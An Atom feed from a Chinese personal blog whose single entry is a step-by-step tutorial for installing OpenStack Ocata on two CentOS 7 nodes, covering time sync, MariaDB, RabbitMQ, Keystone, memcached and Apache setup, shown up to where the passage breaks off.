<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>欧阳博客</title>
  
  <subtitle>三分孤独,七分狂傲</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.5658.pw/"/>
  <updated>2019-05-11T05:42:06.151Z</updated>
  <id>https://www.5658.pw/</id>
  
  <author>
    <name>欧阳 Blog</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Centos7 搭建openstack ocata 版</title>
    <link href="https://www.5658.pw/2019/05/11/Centos7-%E6%90%AD%E5%BB%BAopenstack-ocata-%E7%89%88/"/>
    <id>https://www.5658.pw/2019/05/11/Centos7-搭建openstack-ocata-版/</id>
    <published>2019-05-11T05:21:57.000Z</published>
    <updated>2019-05-11T05:42:06.151Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>一、openstack 介绍</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">OpenStack是一个由NASA（美国国家航空航天局）和Rackspace合作研发并发起的，以Apache许可证授权的自由软件和开放源代码项目。</span><br><span class="line"></span><br><span class="line">OpenStack是一个开源的云计算管理平台项目，由几个主要的组件组合起来完成具体工作。OpenStack支持几乎所有类型的云环境，</span><br><span class="line"></span><br><span class="line">项目目标是提供实施简单、可大规模扩展、丰富、标准统一的云计算管理平台。OpenStack通过各种互补的服务提供了基础设施即服务（IaaS）的解决方案，</span><br><span class="line"></span><br><span class="line">每个服务提供API以进行集成。</span><br><span class="line"></span><br><span class="line">OpenStack是一个旨在为公共及私有云的建设与管理提供软件的开源项目。它的社区拥有超过<span class="number">130</span>家企业及<span class="number">1350</span>位开发者，</span><br><span class="line"></span><br><span class="line">这些机构与个人都将OpenStack作为基础设施即服务（IaaS）资源的通用前端。OpenStack项目的首要任务是简化云的部署过程并为其带来良好的可扩展性。</span><br><span class="line"></span><br><span class="line">本文希望通过提供必要的指导信息，帮助大家利用OpenStack前端来设置及管理自己的公共云或私有云。</span><br><span class="line"></span><br><span class="line">OpenStack云计算平台，帮助服务商和企业内部实现类似于 Amazon EC2 和 S3 的云基础架构服务(Infrastructure <span class="keyword">as</span> a Service, IaaS)。</span><br><span class="line"></span><br><span class="line">OpenStack 包含两个主要模块：Nova 和 Swift，前者是 NASA 开发的虚拟服务器部署和业务计算模块；后者是 Rackspace开发的分布式云存储模块，</span><br><span class="line"></span><br><span class="line">两者可以一起用，也可以分开单独用。OpenStack除了有 Rackspace 和 NASA 的大力支持外，还有包括 Dell、Citrix、 Cisco、 Canonical等重量级公司的贡献和支持，</span><br><span class="line"></span><br><span class="line">发展速度非常快，有取代另一个业界领先开源云平台 Eucalyptus 的态势。</span><br></pre></td></tr></table></figure><a id="more"></a><p>官方文档地址：<a href="https://docs.openstack.org/ocata/install-guide-rdo/glance-install.html&gt;" target="_blank" rel="noopener">https://docs.openstack.org/ocata/install-guide-rdo/glance-install.html&gt;</a></p><h1 id="二、基础环境"><a href="#二、基础环境" class="headerlink" title="二、基础环境"></a><strong>二、基础环境</strong></h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">系统版本： Centos7<span class="number">.3</span>  两块网卡(eth0,eth1)</span><br><span class="line"></span><br><span class="line">机器的配置： <span class="number">4</span>G <span class="number">50</span>G硬盘（两块） <span class="number">4</span>个CPU</span><br><span class="line"></span><br><span class="line">机器名： linux-node1（计算节点）</span><br><span class="line"></span><br><span class="line">机器名： linux-node2（控制节点）</span><br><span class="line"></span><br><span class="line">Node2 IP：eth0 <span class="number">192.168</span><span class="number">.57</span><span class="number">.145</span>， eth1:<span class="number">192.168</span><span class="number">.57</span><span class="number">.146</span></span><br><span class="line"></span><br><span class="line">Node1IP:  eth0: <span class="number">192.168</span><span class="number">.57</span><span class="number">.142</span>  eth1:<span class="number">192.168</span><span class="number">.57</span><span class="number">.143</span></span><br><span class="line"></span><br><span class="line">主控制节点主要安装如下：（keystone、Glance、nova、networking、Dashboard）</span><br><span class="line"></span><br><span class="line">计算节点主要安装如下：（nova、networking）</span><br></pre></td></tr></table></figure><h2 id="2-1-时间同步（node1-node2-操作）"><a href="#2-1-时间同步（node1-node2-操作）" class="headerlink" title="2.1 时间同步（node1 +node2 操作）"></a><strong>2.1 时间同步（node1 +node2 操作）</strong></h2><p><a href="https://docs.openstack.org/ocata/install-guide-rdo/glance-install.html" target="_blank" rel="noopener">https://docs.openstack.org/ocata/install-guide-rdo/glance-install.html</a></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">node1 </span><br><span class="line"># yum install chrony</span><br><span class="line">vim /etc/chrony.conf</span><br><span class="line">设置</span><br><span class="line">allow <span class="number">192.168</span><span class="number">.57</span><span class="number">.0</span>/<span class="number">24</span></span><br><span class="line">####启动</span><br><span class="line">[root@linux-node2 ~]# systemctl enable chronyd.service</span><br><span class="line">[root@linux-node2 ~]#systemctl start chronyd.service</span><br><span class="line">########node1 的时间先同步一下标准时间</span><br><span class="line">[root@linux-node2 ~]# ntpdate pool.ntp.org</span><br><span class="line"># chronyc sources</span><br><span class="line">node2 </span><br><span class="line">修改主配置文件</span><br><span class="line">vim /etc/chrony.conf</span><br><span class="line">把所有行去掉</span><br><span class="line">添加一行</span><br><span class="line">Server <span class="number">192.168</span><span class="number">.57</span><span class="number">.145</span> iburst</span><br><span class="line">[root@linux-node2 ~]#systemctl start chronyd.service</span><br><span class="line"># chronyc sources</span><br></pre></td></tr></table></figure><h2 id="2-2-安装mysql（node2主控制节点操作）"><a href="#2-2-安装mysql（node2主控制节点操作）" class="headerlink" title="2.2 安装mysql（node2主控制节点操作）"></a><strong>2.2 安装mysql（node2主控制节点操作）</strong></h2><p>*配置一下mysql</p><p>添加文件/etc/my.cnf.d/openstack.cnf 内容如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> [mysqld]</span><br><span class="line">bind-address = <span class="number">192.168</span><span class="number">.57</span><span class="number">.145</span></span><br><span class="line"><span class="keyword">default</span>-storage-engine = innodb</span><br><span class="line">innodb_file_per_table</span><br><span class="line">collation-server =utf8_general_ci</span><br><span class="line">init-connect = <span class="string">'SET NAMES utf8'</span></span><br><span class="line">character-set-server = utf8</span><br></pre></td></tr></table></figure><p>重启一下mysql</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@linux-node2 ~]# systemctl enable mariadb.service</span><br><span class="line">[root@linux-node2 ~]# systemctl start mariadb.service</span><br></pre></td></tr></table></figure><p>设置root密码</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@linux-node2 ~]# mysql_secure_installation</span><br></pre></td></tr></table></figure><p>创建数据库</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@linux-node2 ~]# mysql -uroot -p123456 -e "Create database keystone;"</span><br><span class="line">[root@linux-node2 ~]# mysql -uroot -p123456 -e "grant all privileges on keystone.* to 'keystone'@'%' identified by 'keystone'"</span><br><span class="line">[root@linux-node2 ~]# mysql -uroot -p123456 -e "grant all privileges on keystone.* to 'keystone'@'localhost' identified by 'keystone'"</span><br></pre></td></tr></table></figure><h2 id="2-3-安装消息队列（node2控制节点操作）"><a href="#2-3-安装消息队列（node2控制节点操作）" class="headerlink" title="2.3 安装消息队列（node2控制节点操作）"></a><strong>2.3 安装消息队列（node2控制节点操作）</strong></h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># yum install rabbitmq-server</span><br></pre></td></tr></table></figure><p>启动</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># systemctl enable rabbitmq-server.service</span><br><span class="line"># systemctl start rabbitmq-server.service</span><br></pre></td></tr></table></figure><p>新建用户</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># rabbitmqctl add_user openstack openstack</span><br></pre></td></tr></table></figure><p>对用户授权</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rabbitmqctl set_permissions openstack <span class="string">".*"</span> <span class="string">".*"</span> <span class="string">".*"</span></span><br></pre></td></tr></table></figure><p>查看插件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[root@linux-node2 ~]# rabbitmq-plugins list</span><br><span class="line">[ ] amqp_client                       <span class="number">3.3</span><span class="number">.5</span></span><br><span class="line">[ ] cowboy                            <span class="number">0.5</span><span class="number">.0</span>-rmq3<span class="number">.3</span><span class="number">.5</span>-git4b93c2d</span><br><span class="line">[ ] eldap                             <span class="number">3.3</span><span class="number">.5</span>-gite309de4</span><br><span class="line">[ ] mochiweb                          <span class="number">2.7</span><span class="number">.0</span>-rmq3<span class="number">.3</span><span class="number">.5</span>-git680dba8</span><br><span class="line">[ ] rabbitmq_amqp1_0                  <span class="number">3.3</span><span class="number">.5</span></span><br><span class="line">[ ] rabbitmq_auth_backend_ldap        <span class="number">3.3</span><span class="number">.5</span></span><br><span class="line">[ ] rabbitmq_auth_mechanism_ssl       <span class="number">3.3</span><span class="number">.5</span></span><br><span class="line">[ ] rabbitmq_consistent_hash_exchange <span class="number">3.3</span><span class="number">.5</span></span><br><span class="line">[ ] rabbitmq_federation               <span class="number">3.3</span><span class="number">.5</span></span><br><span class="line">[ ] rabbitmq_federation_management    <span class="number">3.3</span><span class="number">.5</span></span><br><span class="line">[ ] rabbitmq_management               <span class="number">3.3</span><span class="number">.5</span></span><br><span class="line">[ ] rabbitmq_management_agent         <span class="number">3.3</span><span class="number">.5</span></span><br><span class="line">[ ] rabbitmq_management_visualiser    <span class="number">3.3</span><span class="number">.5</span></span><br><span class="line">[ ] rabbitmq_mqtt                     <span class="number">3.3</span><span class="number">.5</span></span><br><span class="line">[ ] rabbitmq_shovel                   <span class="number">3.3</span><span class="number">.5</span></span><br><span class="line">[ ] rabbitmq_shovel_management        <span class="number">3.3</span><span class="number">.5</span></span><br><span class="line">[ ] rabbitmq_stomp                    <span class="number">3.3</span><span class="number">.5</span></span><br><span class="line">[ ] rabbitmq_test                     <span class="number">3.3</span><span class="number">.5</span></span><br><span class="line">[ ] rabbitmq_tracing                  <span class="number">3.3</span><span class="number">.5</span></span><br><span class="line">[ ] rabbitmq_web_dispatch             <span class="number">3.3</span><span class="number">.5</span></span><br><span class="line">[ ] rabbitmq_web_stomp                <span class="number">3.3</span><span class="number">.5</span></span><br><span class="line">[ ] rabbitmq_web_stomp_examples       <span class="number">3.3</span><span class="number">.5</span></span><br><span class="line">[ ] sockjs                            <span class="number">0.3</span><span class="number">.4</span>-rmq3<span class="number">.3</span><span class="number">.5</span>-git3132eb9</span><br><span class="line">[ ] webmachine                        <span class="number">1.10</span><span class="number">.3</span>-rmq3<span class="number">.3</span><span class="number">.5</span>-gite9359c7</span><br></pre></td></tr></table></figure><p>启用web插件</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@linux-node2 ~]# rabbitmq-plugins enable rabbitmq_management</span><br></pre></td></tr></table></figure><p>重启一下</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@linux-node2 ~]# systemctl restart rabbitmq-server.service</span><br></pre></td></tr></table></figure><p>检查是否启动成功</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@linux-node2 ~]# netstat -nltp |grep 5672</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">15672</span>           <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      <span class="number">16686</span>/beam.smp      </span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">25672</span>           <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      <span class="number">16686</span>/beam.smp      </span><br><span class="line">tcp6       <span class="number">0</span>      <span class="number">0</span> :::<span class="number">5672</span>                 :::*                    LISTEN      <span class="number">16686</span>/beam.smp      </span><br><span class="line">[root@linux-node2 ~]#</span><br></pre></td></tr></table></figure><p>Web访问</p><p><a href="http://192.168.57.138:15672/#/" target="_blank" rel="noopener">http://192.168.57.138:15672/#/</a></p><p>用户名密码为guest</p><h1 id="三、搭建openstack"><a href="#三、搭建openstack" class="headerlink" title="三、搭建openstack"></a><strong>三、搭建openstack</strong></h1><h2 id="3-1-安装keystone-组件介绍"><a href="#3-1-安装keystone-组件介绍" class="headerlink" title="3.1 安装keystone 组件介绍"></a><strong>3.1 安装keystone 组件介绍</strong></h2><p><strong>Keystone功能：</strong></p><p><strong>1. 用户与认证: 用户权限与用户行为跟踪</strong></p><p><strong>2. 服务目录：提供一个服务目录、包括所有服务项与相关API的端点</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Keystone名词：</span><br><span class="line">User： 用户</span><br><span class="line">Tenant： 租户/项目</span><br><span class="line">Token： 令牌</span><br><span class="line">Role： 角色</span><br><span class="line">Service： 服务</span><br><span class="line">Endpoint： 端点</span><br></pre></td></tr></table></figure><h2 id="3-2-安装keystone-组件（node2-主控制节点操作）"><a href="#3-2-安装keystone-组件（node2-主控制节点操作）" class="headerlink" title="3.2 安装keystone 组件（node2 主控制节点操作）"></a><strong>3.2 安装keystone 组件（node2 主控制节点操作）</strong></h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">安装openstack最新的源：</span><br><span class="line">　　　　#yum install centos-release-openstack-ocata </span><br><span class="line">　　　　#yum install https://rdoproject.org/repos/rdo-release.rpm </span><br><span class="line">　　　　#yum upgrade                                               (在主机上升级包）</span><br><span class="line">　　　　#yum install python-openstackclient            （安装opentack必须的插件）</span><br><span class="line">　　　　#yum install openstack-selinux                    （可选则安装这个插件，我直接关闭了selinux，因为不熟，对后续不会有影响）</span><br><span class="line"> [root@linux-node1 home]# yum install openstack-keystone httpd mod_wsgi</span><br></pre></td></tr></table></figure><h3 id="3-2-1修改配置文件"><a href="#3-2-1修改配置文件" class="headerlink" title="3.2.1修改配置文件"></a><strong>3.2.1修改配置文件</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/keystone/keystone.conf</span><br><span class="line">[database]</span><br><span class="line">connection = mysql:<span class="comment">//keystone:keystone@192.168.57.145/keystone </span></span><br><span class="line">[token]</span><br><span class="line">provider = fernet</span><br></pre></td></tr></table></figure><h3 id="3-2-2同步数据库"><a href="#3-2-2同步数据库" class="headerlink" title="3.2.2同步数据库"></a><strong>3.2.2同步数据库</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">su -s /bin/sh -c <span class="string">"keystone-manage db_sync"</span> keystone</span><br><span class="line">###为什么需要su 一下呢？因为在写日志的时候文件是放在/var/log/keystone 这个下面如果是root用户执行的话。那么写日志的时候就会写不进去。</span><br><span class="line">验证一下是否成功。进入数据库查看有没有表的建立。</span><br><span class="line">MariaDB [keystone]&gt; show tables;</span><br><span class="line">+------------------------+</span><br><span class="line">| Tables_in_keystone     |</span><br></pre></td></tr></table></figure><p>初始化</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># keystone-manage fernet_setup --keystone-user keystone --keystone-group keystone</span><br><span class="line"># keystone-manage credential_setup --keystone-user keystone --keystone-group keystone</span><br></pre></td></tr></table></figure><p>引导身份信息</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">keystone-manage bootstrap --bootstrap-password admin \</span><br><span class="line">  --bootstrap-admin-url http:<span class="comment">//linux-node2:35357/v3/ \</span></span><br><span class="line">  --bootstrap-internal-url http:<span class="comment">//linux-node2:5000/v3/ \</span></span><br><span class="line">  --bootstrap-public-url http:<span class="comment">//linux-node2:5000/v3/ \</span></span><br><span class="line">  --bootstrap-region-id RegionOne</span><br></pre></td></tr></table></figure><h3 id="3-2-3配置memcache的配置-（-etc-sysconfig-memcached-）"><a href="#3-2-3配置memcache的配置-（-etc-sysconfig-memcached-）" class="headerlink" title="3.2.3配置memcache的配置 （**/etc/sysconfig/memcached**）"></a><strong>3.2.3配置memcache的配置 （**</strong>/etc/sysconfig/memcached<strong>**）</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/sysconfig/memcached</span><br><span class="line">OPTIONS=<span class="string">"-l 127.0.0.1,::1,192.168.57.145"</span></span><br></pre></td></tr></table></figure><h3 id="3-2-4启动memcache"><a href="#3-2-4启动memcache" class="headerlink" title="3.2.4启动memcache"></a><strong>3.2.4启动memcache</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@linux-node2 ~]# systemctl start memcached.service</span><br><span class="line"> [root@linux-node2 ~]# netstat -nltp|grep 121</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">11211</span>           <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*               LISTEN      <span class="number">20054</span>/memcached     </span><br><span class="line">tcp6       <span class="number">0</span>      <span class="number">0</span> :::<span class="number">11211</span>                :::*                    LISTEN      <span class="number">20054</span>/memcached</span><br></pre></td></tr></table></figure><h3 id="3-2-5设置apache"><a href="#3-2-5设置apache" class="headerlink" title="3.2.5设置apache"></a><strong>3.2.5设置apache</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /usr/share/keystone/wsgi-keystone.conf /etc/httpd/conf.d/</span><br></pre></td></tr></table></figure><h3 id="3-2-6修改主apache的主配置文件"><a href="#3-2-6修改主apache的主配置文件" class="headerlink" title="3.2.6修改主apache的主配置文件"></a><strong>3.2.6修改主apache的主配置文件</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/httpd/conf/httpd.conf</span><br><span class="line">配置一下Servername</span><br><span class="line">ServerName <span class="number">192.168</span><span class="number">.57</span><span class="number">.145</span>:<span class="number">80</span></span><br></pre></td></tr></table></figure><h3 id="3-2-7启动apache"><a href="#3-2-7启动apache" class="headerlink" title="3.2.7启动apache"></a><strong>3.2.7启动apache</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable httpd.service</span><br><span class="line">systemctl start httpd.service</span><br></pre></td></tr></table></figure><h3 id="3-2-8检查一下是否启动成功了"><a href="#3-2-8检查一下是否启动成功了" class="headerlink" title="3.2.8检查一下是否启动成功了"></a><strong>3.2.8检查一下是否启动成功了</strong></h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@linux-node2 conf.d]# netstat -nltp|grep httpd</span><br><span class="line">tcp6       <span class="number">0</span>      <span class="number">0</span> :::<span class="number">80</span>                   :::*                    LISTEN      <span class="number">20253</span>/httpd         </span><br><span class="line">tcp6       <span class="number">0</span>      <span class="number">0</span> :::<span class="number">35357</span>                :::*                    LISTEN      <span class="number">20253</span>/httpd         </span><br><span class="line">tcp6       <span class="number">0</span>      <span class="number">0</span> :::<span class="number">5000</span>                 :::*                    LISTEN      <span class="number">20253</span>/httpd         </span><br><span class="line">[root@linux-node2 conf.d]#</span><br></pre></td></tr></table></figure><h2 id="3-3-keystone-用户权限"><a href="#3-3-keystone-用户权限" class="headerlink" title="3.3   keystone 用户权限"></a><strong>3.3   keystone 用户权限</strong></h2><h3 id="3-3-1-设置环境变量"><a href="#3-3-1-设置环境变量" class="headerlink" title="3.3.1 设置环境变量"></a><strong>3.3.1 设置环境变量</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">export</span> OS_USERNAME=admin</span><br><span class="line">$ <span class="keyword">export</span> OS_PASSWORD=admin</span><br><span class="line">$ <span class="keyword">export</span> OS_PROJECT_NAME=admin</span><br><span class="line">$ <span class="keyword">export</span> OS_USER_DOMAIN_NAME=Default</span><br><span class="line">$ <span class="keyword">export</span> OS_PROJECT_DOMAIN_NAME=Default</span><br><span class="line">$ <span class="keyword">export</span> OS_AUTH_URL=http:<span class="comment">//linux-node2:35357/v3</span></span><br><span class="line">$ <span class="keyword">export</span> OS_IDENTITY_API_VERSION=<span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="3-3-2创建域、项目、用户和角色"><a href="#3-3-2创建域、项目、用户和角色" class="headerlink" title="3.3.2创建域、项目、用户和角色"></a><strong>3.3.2创建域、项目、用户和角色</strong></h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">创建服务</span><br><span class="line">[root@linux-node2 ~]# openstack project create --domain default --description "Service Project" service</span><br><span class="line">创建demo项目</span><br><span class="line"> [root@linux-node2 ~]# openstack project create --domain default \</span><br><span class="line">&gt; --description <span class="string">"Demo Project"</span> demo</span><br><span class="line">设置demo密码</span><br><span class="line">[root@linux-node2 ~]# openstack user create --domain default \</span><br><span class="line">&gt; --password-prompt demo</span><br><span class="line">创建用户组</span><br><span class="line"> [root@linux-node2 ~]# openstack role create user</span><br><span class="line">加入用户组</span><br><span class="line"> [root@linux-node2 ~]# openstack role add --project demo --user demo user</span><br></pre></td></tr></table></figure><h3 id="3-3-3-验证操作"><a href="#3-3-3-验证操作" class="headerlink" title="3.3.3**验证操作**"></a><strong>3.3.3**</strong>验证操作**</h3><p>\1. 出于安全原因，请禁用临时身份验证令牌机制：  <strong>( 这个可以不操作)</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">编辑/etc/keystone/keystone-paste.ini 文件并删除admin_token_auth从 [pipeline:public_api]，[pipeline:admin_api]和[pipeline:api_v3]段。</span><br></pre></td></tr></table></figure><p>2、取消设置临时 变量OS_AUTH_URL和OS_PASSWORD环境变量：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@linux-node2 ~]#  unset OS_AUTH_URL OS_PASSWORD</span><br></pre></td></tr></table></figure><p>3、作为admin 、请求身份验证令牌</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ openstack --os-auth-url http:<span class="comment">//linux-node2:35357/v3 \</span></span><br><span class="line">  --os-project-domain-name <span class="keyword">default</span> --os-user-domain-name <span class="keyword">default</span> \</span><br><span class="line">  --os-project-name admin --os-username admin token issue</span><br><span class="line">Password:</span><br><span class="line">+------------+-----------------------------------------------------------------+</span><br><span class="line">| Field      | Value                                                           |</span><br><span class="line">+------------+-----------------------------------------------------------------+</span><br><span class="line">| expires    | <span class="number">2016</span><span class="number">-02</span><span class="number">-12</span>T20:<span class="number">14</span>:<span class="number">07.056119</span>Z                                     |</span><br><span class="line">| id         | gAAAAABWvi7_B8kKQD9wdXac8MoZiQldmjEO643d-e_j-XXq9AmIegIbA7UHGPv |</span><br><span class="line">|            | atnN21qtOMjCFWX7BReJEQnVOAj3nclRQgAYRsfSU_MrsuWb4EDtnjU7HEpoBb4 |</span><br><span class="line">|            | o6ozsA_NmFWEpLeKy0uNn_WeKbAhYygrsmQGA49dclHVnz-OMVLiyM9ws       |</span><br><span class="line">| project_id | <span class="number">343</span>d245e850143a096806dfaefa9afdc                                |</span><br><span class="line">| user_id    | ac3377633149401296f6c0d92d79dc16                                |</span><br><span class="line">+------------+-----------------------------------------------------------------+</span><br></pre></td></tr></table></figure><p>4、用demo用户、请求验证令牌</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ openstack --os-auth-url http:<span class="comment">//linux-node2:5000/v3 \</span></span><br><span class="line">  --os-project-domain-name <span class="keyword">default</span> --os-user-domain-name <span class="keyword">default</span> \</span><br><span class="line">  --os-project-name demo --os-username demo token issue</span><br><span class="line">Password:</span><br><span class="line">+------------+-----------------------------------------------------------------+</span><br><span class="line">| Field      | Value                                                           |</span><br><span class="line">+------------+-----------------------------------------------------------------+</span><br><span class="line">| expires    | <span class="number">2016</span><span class="number">-02</span><span class="number">-12</span>T20:<span class="number">15</span>:<span class="number">39.014479</span>Z                                     |</span><br><span class="line">| id         | gAAAAABWvi9bsh7vkiby5BpCCnc-JkbGhm9wH3fabS_cY7uabOubesi-Me6IGWW |</span><br><span class="line">|            | yQqNegDDZ5jw7grI26vvgy1J5nCVwZ_zFRqPiz_qhbq29mgbQLglbkq6FQvzBRQ |</span><br><span class="line">|            | JcOzq3uwhzNxszJWmzGC7rJE_H0A_a3UFhqv8M4zMRYSbS2YF0MyFmp_U       |</span><br><span class="line">| project_id | ed0b60bf607743088218b0a533d5943f                                |</span><br><span class="line">| user_id    | <span class="number">58126687</span>cbcc4888bfa9ab73a2256f27                                |</span><br></pre></td></tr></table></figure><h3 